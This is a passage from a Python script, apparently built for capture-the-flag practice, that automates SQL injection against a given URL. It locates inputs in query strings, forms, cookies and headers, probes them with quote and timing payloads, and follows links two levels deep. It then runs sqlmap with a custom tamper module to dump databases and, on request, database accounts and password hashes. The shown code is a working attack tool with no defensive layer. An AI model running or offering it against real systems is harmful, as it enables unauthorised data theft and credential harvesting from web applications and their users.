            say("      fast channel (%s) -> dumping everything" % ", ".join(types))
            _, stopped = go(["--dump-all", "--exclude-sysdbs"], "dump")
        else:
            say("      blind channel (%s) = slow -> flag-like tables first" % ", ".join(types))
            before, left = len(FOUND), []
            for db, tabs in dbs.items():
                for rx in PRI:
                    group = [t for t in tabs if rx.search(t)]; tabs = [t for t in tabs if t not in group]
                    if not group or stopped: continue
                    if len(FOUND) > before: left += group; continue
                    _, stopped = go((["-D", db] if db else []) + ["-T", ",".join(group), "--dump"], "dump_" + re.sub(r"\W", "_", group[0]))
            if left: say("      flag found. Not dumped (blind is slow): %s -> rerun with --all to get them too" % ", ".join(left))
        if stopped: return True
        dbms = (re.search(r"^back-end DBMS: (.+)", text, re.M) or [None, ""])[1]
        if args.dbusers: say("    DB accounts + hashes:"); go(["--users", "--passwords"], "users")
        elif re.search(r"mysql|maria", dbms, re.I): say("    next: MySQL -> DB accounts + password hashes: rerun with --dbusers")
        return True
    return False

# ---------------------------------------------------------------- main
def main():
    global DELAY, LOG
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--data", help="POST body: 'a=1&b=2' or '{\"id\":\"1\"}'")
    ap.add_argument("--cookie", help="'name=value; name2=value2' sent with every request (also tested)")
    ap.add_argument("-H", "--header", action="append", default=[], help="'Name: value' sent with every request (repeatable)")
    ap.add_argument("-p", dest="param", help="only this parameter name")
    ap.add_argument("--look", action="store_true", help="find inputs, test yes/no payloads, print the sqlmap command - no dump")
    ap.add_argument("--no-sqlmap", action="store_true", help="stop after the quick payloads")
    ap.add_argument("--all", action="store_true", help="dump every database, not only the current one")
    ap.add_argument("--dbusers", action="store_true", help="also fetch DB accounts + password hashes")
    ap.add_argument("--delay", type=float, default=0.0, help="seconds between requests (rate limit)")
    ap.add_argument("--threads", type=int, default=1, help="sqlmap threads; 4 = faster blind dumps (ignored with --delay)")
    ap.add_argument("--max-time", type=int, default=600, help="seconds allowed per sqlmap run")
    ap.add_argument("--flag", help="extra flag regex, e.g. 'SIT\\{.*?\\}'")
    ap.add_argument("--out", help="output folder (default ./out_sql/<host>_<time>)")
    ap.add_argument("-v", "--verbose", action="store_true", help="show all sqlmap output")
    args = ap.parse_args()
    url = args.url if re.match(r"https?://", args.url) else "http://" + args.url
    DELAY = args.delay
    if args.flag: FLAG_RES.insert(0, args.flag)
    for h in args.header:
        k, _, v = h.partition(":"); HEADERS[k.strip()] = v.strip()
    if args.cookie: COOKIES.update(dict(x.strip().split("=", 1) for x in args.cookie.split(";") if "=" in x))
    out = args.out or os.path.join("out_sql", re.sub(r"[^A-Za-z0-9.]+", "_", urlsplit(url).netloc + urlsplit(url).path).strip("_") + time.strftime("_%H%M%S"))
    out = os.path.abspath(out); os.makedirs(os.path.join(out, "tamper"), exist_ok=True)
    LOG = open(os.path.join(out, "run.log"), "w"); loot = open(os.path.join(out, "loot.txt"), "w")
    open(os.path.join(out, "tamper", "__init__.py"), "w").close(); open(os.path.join(out, "tamper", "nestkw.py"), "w").write(NESTKW)
    t0 = time.time()

    say("[1] LOCATE  %s" % url)
    jar = http.cookiejar.CookieJar(); status, body = fetch("GET", url, headers=session_headers(), jar=jar)
    if not status: sys.exit("    no answer from %s - check the URL / VPN" % url)
    if FINAL.split("?")[0].rstrip("/") != url.split("?")[0].rstrip("/"): say("    redirected to %s -> using that" % FINAL); url = FINAL
    for f in sniff(body, "page %s as served" % url): say("    >>> FLAG-SHAPED text already on the page: %s" % f)
    for ck in jar: COOKIES.setdefault(ck.name, ck.value)
    cands, pg = locate(url, body, args)
    cands += [Cand(url.split("?")[0], "cookie", k, {k: v}, dict(parse_qsl(urlsplit(url).query)), "cookie") for k, v in COOKIES.items()]
    for h in list(HEADERS):
        if HEADERS[h].endswith("*"): v = HEADERS.pop(h)[:-1]; cands.append(Cand(url.split("?")[0], "header", h, {h: v}, dict(parse_qsl(urlsplit(url).query)), "-H"))
    if args.param: cands = [c for c in cands if c.name == args.param]
    say("    HTTP %s, %d input(s): %s" % (status, len(cands), "; ".join("%s (%s)" % (c.label(), c.src) for c in cands) or "none"))

    say("[2] PROBE   ' and \" in each input")
    live = [c for c in cands if probe(c)]
    live += [c for c in cands if not c.live and c.src in ("URL", "--data", "form on page") and c.place != "cookie" and timeprobe(c)]
    if not live and not args.data:
        live = [c for c in sweep(url) if probe(c) and (not args.param or c.name == args.param)]
    if not live and not args.param:                                   # still nothing here: follow links, two clicks deep
        host = urlsplit(url).netloc; seen = {url.split("?")[0]}; known = {c.key() for c in cands}; swept = pages = 0
        links = lambda page, at: [(u, d) for u, d in ((urljoin(at[0], h).split("#")[0], at[1] + 1) for h in page.links)
                                  if u.startswith("http") and urlsplit(u).netloc == host and not re.search(r"logout|signout|delete|remove", u, re.I)]
        queue = links(pg, (url, 0))
        while queue and pages < 25:
            u, depth = queue.pop(0)
            if u.split("?")[0] in seen: continue
            seen.add(u.split("?")[0]); pages += 1; s, b = fetch("GET", u, headers=session_headers())
            for f in sniff(b, "page %s as served" % u): say("    >>> FLAG-SHAPED text on %s: %s" % (u, f))
            every, pg2 = locate(u, b, argparse.Namespace(data=None))
            sub = [c for c in every if c.key() not in known]; known.update(c.key() for c in sub); found = [c for c in sub if probe(c)]
            if not every and swept < 3:                                # page without any input: hidden cookie / header?
                swept += 1; found = [c for c in sweep(u) if c.key() not in known and probe(c)]; known.update(c.key() for c in found)
            cands += sub; live += found
            say("    followed %s -> %d input(s), %d live" % (urlsplit(u).path, len(sub), len(found)))
            if depth < 2: queue += links(pg2, (u, depth))
    for c in cands:
        if c not in live and c.src != "sweep": say("    dead  %s" % c.label())
    for c in live: say("    LIVE  %s   <- %s%s" % (c.label(), c.live, ", looks like %s" % c.dbms if c.dbms else ""))
    if not live:
        say("    no live input. Try: the exact page from the question, --data for a POST body, --cookie after logging in,\n"
            "    -H 'X-Forwarded-For: 1*' for a header, or by hand: notes/cheatsheet/05_sqli.md")

    if args.look:
        for c in live:
            say("[3] LOOK    %s" % c.label()); diagnose(c)
            say("    $ %s" % shown(sqlmap_cmd(c, ladder(c, os.path.join(out, "tamper"))[0][1] + ["--dump"], out, args)))
        say("    look only: nothing dumped. Saved: %s/run.log" % out); return
    for n, c in enumerate(live, 1):
        try:
            say("[3] QUICK   %s" % c.label())
            bypass(c) if c.login else quick(c)
            diagnose(c)
            if args.no_sqlmap: continue
            say("[4] SQLMAP  %s   (Ctrl-C = skip this run)" % c.label())
            if not attack(c, n, out, args, loot):
                if not (c.diag or c.login or c.live.startswith(("SQL error", "answers"))):
                    say("    no SQL error, no yes/no payload, sqlmap found nothing -> this input is probably NOT SQL injection.\n"
                        "      file / page name in it -> notes/cheatsheet/06_lfi.md      number or cookie to change, ; id -> 03_web_enum.md")
                say("    sqlmap got nothing here. By hand: notes/cheatsheet/05_sqli.md   or the script that needs no sqlmap:\n"
                    "      python3 sql/sqli/sqli_guide.py '%s' --place %s --param %s --list" % (c.url, c.place, c.name))
        except KeyboardInterrupt:
            say("    skipped (Ctrl-C)")

    say("[5] REPORT  %d request(s) by this script + sqlmap's own, %.0f s" % (NREQ, time.time() - t0))
    if FOUND:
        for f, where in FOUND.items(): say("    >>> %s      <- %s" % (f, where))
        say("    submit as ehCTF{...}: if the text above has another wrapper or none, put the inner value inside ehCTF{ }")
    else:
        say("    nothing flag-shaped. Read the tables above / loot.txt - the answer may be a plain value (password, name, hash).")
    say("    saved: %s/  (run.log, loot.txt, commands.txt, sqlmap logs)" % out)

if __name__ == "__main__":
    main()
